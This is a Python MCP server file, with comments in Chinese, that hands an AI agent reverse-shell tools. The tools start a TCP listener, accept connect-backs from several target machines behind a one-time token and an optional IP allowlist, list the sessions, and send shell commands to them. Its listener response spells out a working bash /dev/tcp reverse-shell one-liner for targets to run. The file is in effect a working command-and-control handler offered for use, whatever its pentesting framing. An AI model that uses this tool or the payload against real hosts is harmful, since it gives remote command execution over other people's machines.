#!/usr/bin/env python3
"""
Reverse Shell MCP Server - 反向 Shell MCP 服务

通过 MCP 协议暴露反向 Shell 能力：开启/停止监听、同时管理多个已连接目标（session）、
与指定 session 交互执行命令。内置握手 token 鉴别、来源 IP 白名单与输出大小上限，
避免第三方抢连或超大输出耗尽内存。
无需修改 Jy技術團隊 后端，在「设置 → 外部 MCP」中以 stdio 方式添加即可。

依赖：pip install mcp（或使用项目 venv）
运行：python mcp_reverse_shell.py  或  python3 mcp_reverse_shell.py
"""

from __future__ import annotations

import asyncio
import ipaddress
import secrets
import socket
import threading
import time
from typing import Any

import yaml

try:  # MCP SDK 2.x
    from mcp.server.mcpserver import MCPServer as FastMCP
except ImportError:  # MCP SDK 1.x compatibility
    from mcp.server.fastmcp import FastMCP

# ---------------------------------------------------------------------------
# 反向 Shell 状态（一个监听器 + 多个已通过握手的 session）
# ---------------------------------------------------------------------------

_LISTENER: socket.socket | None = None
_LISTENER_THREAD: threading.Thread | None = None
_LISTENER_PORT: int | None = None
_LOCK = threading.Lock()
_STOP_EVENT = threading.Event()
_READY_EVENT = threading.Event()
_LAST_LISTEN_ERROR: str | None = None
_LISTENER_THREAD_JOIN_TIMEOUT = 1.0
_START_READY_TIMEOUT = 1.5

# 握手鉴别：start_listener 时生成一次性 token 并返回给调用者；
# 目标端反弹连接后的第一包必须包含该 token，否则立即断开并记录。
_AUTH_TOKEN: str | None = None
_HANDSHAKE_TIMEOUT = 10.0     # 等待目标端第一包（含 token）的最长秒数
_ALLOWED_IPS: list[str] = []  # 来源 IP 白名单；为空 = 接受任意来源（维持旧行为）
# 会话表：session_id -> {sock, addr, connected_at, last_active}
_SESSIONS: dict[str, dict[str, Any]] = {}
_SESSION_SEQ = 0
# 安全事件日志（拒绝/断开等），仅保留最近 _MAX_EVENTS 条
_EVENTS: list[str] = []
_MAX_EVENTS = 50
# 单次 send_command 读取输出的字节上限，防止目标回传超大输出耗尽内存
_RECV_MAX_BYTES = 1024 * 1024
_LISTEN_BACKLOG = 16

# 用于 send_command 的输出结束标记（避免无限等待）
_END_MARKER = "__RS_DONE__"
_RECV_TIMEOUT = 30.0
_RECV_CHUNK = 4096


def _get_local_ips() -> list[str]:
    """获取本机 IP 列表（供目标机反弹连接用），优先非 127 地址。"""
    ips: list[str] = []
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and ip != "127.0.0.1":
            ips.append(ip)
    except OSError:
        pass
    if not ips:
        try:
            ip = socket.gethostbyname(socket.gethostname())
            if ip:
                ips.append(ip)
        except OSError:
            pass
    if not ips:
        ips.append("127.0.0.1")
    return ips


def _close_quietly(sock: socket.socket | None) -> None:
    """关闭 socket 并吞掉关闭阶段的异常。"""
    if sock is None:
        return
    try:
        sock.close()
    except OSError:
        pass


def _log_event(msg: str) -> None:
    """记录安全事件（握手失败、来源被拒、断开等），仅保留最近若干条。"""
    stamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with _LOCK:
        _EVENTS.append(f"[{stamp}] {msg}")
        if len(_EVENTS) > _MAX_EVENTS:
            del _EVENTS[: len(_EVENTS) - _MAX_EVENTS]


def _validate_allowed_ips(ips: list[str]) -> list[str]:
    """校验白名单 IP 格式，返回其中无效项（空列表 = 全部有效）。"""
    bad: list[str] = []
    for ip in ips:
        try:
            ipaddress.ip_address(ip.strip())
        except ValueError:
            bad.append(ip.strip())
    return bad


def _ip_allowed(ip: str) -> bool:
    """来源 IP 过滤：白名单为空时接受任意来源（维持旧行为），非空时仅接受名单内 IP。"""
    with _LOCK:
        allowed = list(_ALLOWED_IPS)
    if not allowed:
        return True
    return ip in allowed


def _register_session(client: socket.socket, addr: tuple[str, int]) -> str:
    """把通过握手的连接登记进 session 表，返回新分配的 session_id。"""
    global _SESSION_SEQ
    with _LOCK:
        _SESSION_SEQ += 1
        sid = f"sess-{_SESSION_SEQ:04d}"
        _SESSIONS[sid] = {
            "sock": client,
            "addr": (addr[0], addr[1]),
            "connected_at": time.time(),
            "last_active": time.time(),
        }
    return sid


def _remove_session(sid: str, reason: str) -> None:
    """从 session 表移除指定 session 并关闭连接。"""
    with _LOCK:
        entry = _SESSIONS.pop(sid, None)
    if entry is None:
        return
    _close_quietly(entry["sock"])
    ip, port = entry["addr"]
    _log_event(f"session {sid} ({ip}:{port}) 已断开: {reason}")


def _resolve_session(session_id: str | None) -> tuple[str | None, str]:
    """解析目标 session。

    - 显式给定 session_id：查表校验；
    - 未给定：恰好只有一个 session 时自动选用；多个时报错并列出可选 id。

    返回 (session_id, 错误消息)；成功时错误消息为空字符串。
    """
    with _LOCK:
        live_ids = sorted(_SESSIONS.keys())
    if session_id:
        if session_id in live_ids:
            return session_id, ""
        avail = ", ".join(live_ids) if live_ids else "(无)"
        return None, f"错误：session {session_id} 不存在或已断开。当前可用 session: {avail}"
    if not live_ids:
        return None, "错误：当前无已连接 session。请先 start_listener，等待目标携带 token 连接后再操作。"
    if len(live_ids) == 1:
        return live_ids[0], ""
    return None, (
        f"错误：当前有 {len(live_ids)} 个 session，未指定 session_id。"
        f"可用 session: {', '.join(live_ids)}（可用 reverse_shell_sessions 查看详情）。"
    )


def _handshake(client: socket.socket, addr: tuple[str, int]) -> str | None:
    """等待目标端第一包并校验一次性 token。

    第一包必须包含当前监听器生成的 token，否则断开并记录；第一包中 token
    之外的内容会被丢弃。成功返回 session_id，失败返回 None（由调用方关闭连接）。
    """
    with _LOCK:
        token = _AUTH_TOKEN
    if not token:
        _log_event(f"拒绝 {addr[0]}:{addr[1]}：监听器无有效 token（可能刚停止）")
        return None
    try:
        client.settimeout(_HANDSHAKE_TIMEOUT)
        first = client.recv(_RECV_CHUNK)
    except OSError as e:
        _log_event(f"拒绝 {addr[0]}:{addr[1]}：读取握手数据失败: {e}")
        return None
    if not first:
        _log_event(f"拒绝 {addr[0]}:{addr[1]}：未发送 token 即关闭连接")
        return None
    if token.encode("utf-8") not in first:
        _log_event(f"拒绝 {addr[0]}:{addr[1]}：握手 token 不匹配（已丢弃 {len(first)} 字节）")
        return None
    sid = _register_session(client, addr)
    _log_event(f"session {sid} 已建立（{addr[0]}:{addr[1]}，握手通过）")
    return sid


def _handle_client(client: socket.socket, addr: tuple[str, int]) -> None:
    """单客户端处理（独立线程，accept 循环不被阻塞）：来源过滤 + 握手鉴别。"""
    if not _ip_allowed(addr[0]):
        _log_event(f"拒绝 {addr[0]}:{addr[1]}：来源 IP 不在白名单")
        _close_quietly(client)
        return
    if _handshake(client, addr) is None:
        _close_quietly(client)


def _accept_loop(port: int, allowed_ips: list[str], token: str) -> None:
    """后台线程：bind、listen、循环 accept 多个客户端；每个连接交给独立线程处理。"""
    global _LISTENER, _LISTENER_PORT, _LAST_LISTEN_ERROR, _ALLOWED_IPS, _AUTH_TOKEN
    sock: socket.socket | None = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", port))
        sock.listen(_LISTEN_BACKLOG)
        # 避免 stop_listener 关闭后 accept() 长时间不返回：用超时轮询检查停止事件
        sock.settimeout(0.5)
        with _LOCK:
            _LISTENER = sock
            _LISTENER_PORT = port
            _ALLOWED_IPS = list(allowed_ips)
            _AUTH_TOKEN = token
            _LAST_LISTEN_ERROR = None
            _READY_EVENT.set()
        # 持续 accept 多个客户端，直到 stop 事件
        while not _STOP_EVENT.is_set():
            try:
                client, addr = sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            th = threading.Thread(
                target=_handle_client,
                args=(client, (addr[0], addr[1])),
                daemon=True,
            )
            th.start()
    except OSError as e:
        with _LOCK:
            _LAST_LISTEN_ERROR = str(e)
            _READY_EVENT.set()
    finally:
        with _LOCK:
            _LISTENER = None
            _LISTENER_PORT = None
        _close_quietly(sock)


def _start_listener(port: int, allowed_ips: list[str] | None = None) -> str:
    global _LISTENER_THREAD, _AUTH_TOKEN, _LAST_LISTEN_ERROR
    old_thread: threading.Thread | None = None
    with _LOCK:
        if _LISTENER is not None:
            # _LISTENER_PORT 可能短暂为 None（例如刚 stop/start），因此做个兜底显示
            show_port = _LISTENER_PORT if _LISTENER_PORT is not None else port
            tok = _AUTH_TOKEN or "(未知)"
            return (
                f"已在监听中（端口: {show_port}），沿用当前握手 token: {tok}。"
                f"如需重新生成 token，请先 stop_listener 再 start。"
            )
        # 重新监听前清掉旧 session，避免悬挂连接
        old_sessions = dict(_SESSIONS)
        _SESSIONS.clear()
        old_thread = _LISTENER_THREAD
    for entry in old_sessions.values():
        _close_quietly(entry["sock"])
    _AUTH_TOKEN = None

    # 若旧线程还没完全退出，短暂等待一下以减少端口绑定失败概率
    if old_thread is not None and old_thread.is_alive():
        old_thread.join(timeout=0.5)

    allow = [ip.strip() for ip in (allowed_ips or []) if ip.strip()]
    token = secrets.token_hex(16)
    _STOP_EVENT.clear()
    _READY_EVENT.clear()
    _LAST_LISTEN_ERROR = None
    th = threading.Thread(target=_accept_loop, args=(port, allow, token), daemon=True)
    th.start()
    _LISTENER_THREAD = th

    # 等待后台线程完成 bind/listen（或失败）
    _READY_EVENT.wait(timeout=_START_READY_TIMEOUT)
    with _LOCK:
        err = _LAST_LISTEN_ERROR
        listening = _LISTENER is not None

    if listening:
        ips = _get_local_ips()
        addrs = ", ".join(f"{ip}:{port}" for ip in ips)
        wl = ", ".join(allow) if allow else "未启用（接受任意来源）"
        return (
            f"已在 0.0.0.0:{port} 开始监听。目标机请反弹到: {addrs}（任选其一）。\n"
            f"握手 token（一次性，重启监听会更换）: {token}\n"
            f"目标端连接后的第一包必须包含该 token，否则会被断开并记录。\n"
            f"反弹示例: bash -c 'exec 3<>/dev/tcp/<监听IP>/{port}; echo {token} >&3; exec bash -i <&3 >&3 2>&3'\n"
            f"来源 IP 白名单: {wl}\n"
            f"连接后用 reverse_shell_sessions 查看 session，用 reverse_shell_send_command 执行命令。"
        )

    if err:
        return f"启动监听失败（0.0.0.0:{port}）：{err}"

    # 仍未准备好：可能线程调度较慢或环境异常；给出可操作的提示
    return f"启动监听未确认成功（0.0.0.0:{port}）。请调用 reverse_shell_status 确认，或稍后重试。"


def _stop_listener() -> str:
    global _LISTENER, _LISTENER_THREAD, _LISTENER_PORT, _AUTH_TOKEN
    listener_sock: socket.socket | None = None
    old_thread: threading.Thread | None = None
    with _LOCK:
        _STOP_EVENT.set()
        _READY_EVENT.set()
        listener_sock = _LISTENER
        old_thread = _LISTENER_THREAD
        _LISTENER = None
        _LISTENER_PORT = None
        _AUTH_TOKEN = None
        old_sessions = dict(_SESSIONS)
        _SESSIONS.clear()

    _close_quietly(listener_sock)
    for entry in old_sessions.values():
        _close_quietly(entry["sock"])
    if old_sessions:
        _log_event(f"stop_listener：已断开 {len(old_sessions)} 个 session")

    # 等待监听线程退出，避免 stop/start 竞态导致“端口 None 仍提示已在监听中”
    if old_thread is not None and old_thread.is_alive():
        old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
    with _LOCK:
        _LISTENER_THREAD = None
    return f"监听已停止，已断开全部 session（{len(old_sessions)} 个，如有）。"


def _disconnect_session(session_id: str | None = None) -> str:
    """断开一个 session（未指定且仅有一个时自动选用），不影响监听与其他 session。"""
    sid, err = _resolve_session(session_id)
    if sid is None:
        return err
    with _LOCK:
        entry = _SESSIONS.pop(sid, None)
    if entry is None:
        return f"错误：session {sid} 不存在或已断开。"
    _close_quietly(entry["sock"])
    ip, port = entry["addr"]
    _log_event(f"session {sid} ({ip}:{port}) 已被操作者主动断开")
    return f"已断开 session {sid}（{ip}:{port}），监听与其余 session 不受影响。"


def _list_sessions() -> list[dict[str, Any]]:
    """返回当前 session 表的快照（供 sessions/status 工具展示）。"""
    with _LOCK:
        now = time.time()
        return [
            {
                "session_id": sid,
                "ip": entry["addr"][0],
                "port": entry["addr"][1],
                "connected_at": entry["connected_at"],
                "connected_at_str": time.strftime(
                    "%Y-%m-%d %H:%M:%S", time.localtime(entry["connected_at"])
                ),
                "uptime_sec": int(now - entry["connected_at"]),
                "idle_sec": int(now - entry["last_active"]),
                "status": "connected",
            }
            for sid, entry in _SESSIONS.items()
        ]


def _status() -> dict[str, Any]:
    sessions = _list_sessions()
    with _LOCK:
        listening = _LISTENER is not None
        port = _LISTENER_PORT
        allowed = list(_ALLOWED_IPS)
    connect_back = None
    if listening and port is not None:
        ips = _get_local_ips()
        connect_back = [f"{ip}:{port}" for ip in ips]
    first = sessions[0] if sessions else None
    return {
        "listening": listening,
        "port": port,
        "connect_back": connect_back,
        "connected": bool(sessions),  # 兼容旧字段：是否有客户端连接
        "client_address": f"{first['ip']}:{first['port']}" if first else None,  # 兼容旧字段
        "session_count": len(sessions),
        "sessions": sessions,
        "allowed_ips": allowed,
        "auth_required": True,
    }


def _send_command_blocking(command: str, session_id: str | None = None, timeout: float = _RECV_TIMEOUT) -> str:
    """在同步上下文中向指定（或唯一）session 发送命令并读取输出。

    带结束标记避免无限等待；单次读取上限 _RECV_MAX_BYTES（1MB），
    超出部分被丢弃并在结果中注明，防止目标用超大输出耗尽内存。
    """
    sid, err = _resolve_session(session_id)
    if sid is None:
        return err
    with _LOCK:
        entry = _SESSIONS.get(sid)
        client = entry["sock"] if entry is not None else None
    if client is None:
        return f"错误：session {sid} 已断开。"
    # 使用结束标记以便可靠地截断输出
    wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
    try:
        client.settimeout(timeout)
        client.sendall(wrapped.encode("utf-8", errors="replace"))
        marker = _END_MARKER.encode()
        data = b""
        truncated = False
        while True:
            try:
                chunk = client.recv(_RECV_CHUNK)
            except socket.timeout:
                break
            if not chunk:
                break
            if len(data) + len(chunk) > _RECV_MAX_BYTES:
                data += chunk[: _RECV_MAX_BYTES - len(data)]
                truncated = True
                break
            data += chunk
            if marker in data:
                break
        with _LOCK:
            entry = _SESSIONS.get(sid)
            if entry is not None:
                entry["last_active"] = time.time()
        text = data.decode("utf-8", errors="replace")
        if _END_MARKER in text:
            text = text.split(_END_MARKER)[0].strip()
        if truncated:
            text += f"\n...（输出超过 {_RECV_MAX_BYTES} 字节上限，已截断）"
        return text or "(无输出)"
    except (ConnectionResetError, BrokenPipeError, OSError) as e:
        _remove_session(sid, f"连接错误: {e}")
        return f"连接已断开: {e}"
    except Exception as e:
        return f"执行异常: {e}"


# ---------------------------------------------------------------------------
# MCP 服务与工具
# ---------------------------------------------------------------------------

app = FastMCP(
    name="reverse-shell",
    instructions=(
        "反向 Shell MCP：在本地开启 TCP 监听，目标机携带一次性握手 token 反弹连接后"
        "形成多个受管 session；可列出全部 session，并向指定 session 下发命令。"
    ),
)


@app.tool(
    description=(
        "在指定端口启动反向 Shell 监听（支持多目标同时连入）。"
        "返回一次性握手 token：目标端反弹后的第一包必须包含该 token，否则连接被拒绝并记录。"
        '可选 allowed_ips 为来源 IP 白名单（如 ["10.0.0.8"]）；留空接受任意来源。'
    ),
)
def reverse_shell_start_listener(port: int, allowed_ips: list[str] | None = None) -> str:
    """Start reverse shell listener on the given port (e.g. 4444)."""
    if port < 1 or port > 65535:
        return "端口需在 1–65535 之间。"
    if allowed_ips:
        bad = _validate_allowed_ips(allowed_ips)
        if bad:
            return f"allowed_ips 含无效 IP 地址: {', '.join(bad)}"
    return _start_listener(port, allowed_ips)


@app.tool(
    description="停止反向 Shell 监听并断开全部 session。",
)
def reverse_shell_stop_listener() -> str:
    """Stop the listener and disconnect all sessions."""
    return _stop_listener()


@app.tool(
    description="查看当前状态：是否在监听、端口、session 数量、客户端地址与 IP 白名单。",
)
def reverse_shell_status() -> str:
    """Get listener and session status."""
    s = _status()
    lines = [
        f"监听中: {s['listening']}",
        f"端口: {s['port']}",
        f"反弹地址(目标机连接): {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
        f"session 数: {s['session_count']}",
        f"已连接: {s['connected']}",
        f"客户端: {s['client_address'] or '-'}",
        f"IP 白名单: {', '.join(s['allowed_ips']) if s['allowed_ips'] else '未启用'}",
    ]
    return "\n".join(lines)


@app.tool(
    description=(
        "列出当前全部反向 Shell session：session_id、来源 IP:端口、连接时间、状态，"
        "以及最近的拒绝/断开事件。多个 session 时，send_command/disconnect "
        "需用其中的 session_id 指定目标。"
    ),
)
def reverse_shell_sessions() -> str:
    """List all connected reverse shell sessions."""
    sessions = _list_sessions()
    with _LOCK:
        events = list(_EVENTS[-10:])
    lines: list[str] = []
    if not sessions:
        lines.append("当前无已连接 session（监听中会持续接受携带 token 的新连接）。")
    else:
        lines.append(f"共 {len(sessions)} 个 session:")
        for it in sessions:
            lines.append(
                f"- {it['session_id']} | 来源 {it['ip']}:{it['port']}"
                f" | 连接于 {it['connected_at_str']} | 存活 {it['uptime_sec']}s | 状态: {it['status']}"
            )
    if events:
        lines.append("最近事件（含拒绝记录）:")
        lines.extend(f"  {ev}" for ev in events)
    return "\n".join(lines)


@app.tool(
    description=(
        "向指定 session 发送命令并返回输出（单次输出上限 1MB）。"
        "session_id 可选：只有一个 session 时自动选用；有多个 session 时必须指定，"
        "否则报错并列出可选 id（可用 reverse_shell_sessions 查询）。"
    ),
)
async def reverse_shell_send_command(command: str, session_id: str | None = None) -> str:
    """Send a command to a reverse shell session and return output."""
    # 在线程池中执行阻塞的 socket I/O，避免长时间占用 MCP 主线程，使 status/stop_listener 等仍可响应
    return await asyncio.to_thread(_send_command_blocking, command, session_id)


@app.tool(
    description=(
        "断开指定 session（session_id 可选：仅一个时自动选用），不影响监听与其他 session。"
    ),
)
def reverse_shell_disconnect(session_id: str | None = None) -> str:
    """Disconnect one reverse shell session without stopping the listener."""
    return _disconnect_session(session_id)


if __name__ == "__main__":
    app.run(transport="stdio")
